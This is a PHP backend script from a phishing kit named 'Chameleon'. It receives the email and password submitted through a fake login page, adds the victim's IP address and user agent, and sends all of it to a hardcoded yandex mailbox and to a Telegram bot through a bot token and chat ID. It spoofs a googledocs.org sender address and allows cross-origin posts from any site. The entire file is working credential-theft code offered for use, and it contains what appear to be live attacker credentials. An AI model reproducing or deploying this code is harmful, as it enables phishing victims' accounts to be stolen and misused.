<?php
/*
CORS Setup to not have problems with HTML File
*/
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS, post, get");
header("Access-Control-Max-Age", "3600");
header("Access-Control-Allow-Headers: *");
header("Access-Control-Allow-Credentials: true");

$EMAILS = "gustavorodriguez247@yandex.com"; // YOUR EMAIL

if ((!empty(trim($_POST['email'])) && !empty(trim($_POST['password'])))) {
    function get_client_ip() {
        $ipaddress = "";
        if (getenv("HTTP_CLIENT_IP"))
            $ipaddress = getenv("HTTP_CLIENT_IP");
        else if(getenv("HTTP_X_FORWARDED_FOR"))
            $ipaddress = getenv("HTTP_X_FORWARDED_FOR");
        else if(getenv("HTTP_X_FORWARDED"))
            $ipaddress = getenv("HTTP_X_FORWARDED");
        else if(getenv("HTTP_FORWARDED_FOR"))
            $ipaddress = getenv("HTTP_FORWARDED_FOR");
        else if(getenv("HTTP_FORWARDED"))
            $ipaddress = getenv("HTTP_FORWARDED");
        else if(getenv("REMOTE_ADDR"))
            $ipaddress = getenv("REMOTE_ADDR");
        else
            $ipaddress = "UNKNOWN";
        return $ipaddress;
    }
    
    function ParseUA(){
        $UA = "";
        $UAHeaders = [
        "HTTP_USER_AGENT",
        "HTTP_X_OPERAMINI_PHONE_UA",
        "HTTP_X_DEVICE_USER_AGENT",
        "HTTP_X_ORIGINAL_USER_AGENT",
        "HTTP_X_SKYFIRE_PHONE",
        "HTTP_X_BOLT_PHONE_UA",
        "HTTP_DEVICE_STOCK_UA",
        "HTTP_X_UCBROWSER_DEVICE_UA",
        "HTTP_FROM",
        "HTTP_X_SCANNER"
        ];
        foreach ($UAHeaders as $header){
          if (isset($_SERVER[$header]) && !empty(trim($_SERVER[$header]))) {
            $UA = $_SERVER[$header];
            break;
          }  
        }
        return $UA;
    }



    $IP = get_client_ip();
    $UserAgent = ParseUA();
    $email = $_POST['email'];
    $password = $_POST['password'];
    $telegrambot = '6511565745:AAGXzEony7CkyaASBZiM9nFqVmqkci87VVE';
    $telegramchatid =  6028066900;

    $message = "******* Chameleon result ******".PHP_EOL;
    $message .= "Email: {$email}".PHP_EOL;
    $message .= "Password: {$password}".PHP_EOL;
    $message .= "IP: https://ip-api.com/${IP}".PHP_EOL;
    $message .= "User-Agent: {$UserAgent}".PHP_EOL;
    $message .= "**************************".PHP_EOL;    
    $subject = "Chameleon Result";
    $headers = "From: Chameleon<wirez@googledocs.org>";
    mail($EMAILS,$subject,$message,$headers);
    $website="https://api.telegram.org/bot".$telegrambot;
    $params=['chat_id'=>$telegramchatid, 'text'=>$message];
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    
}

?>
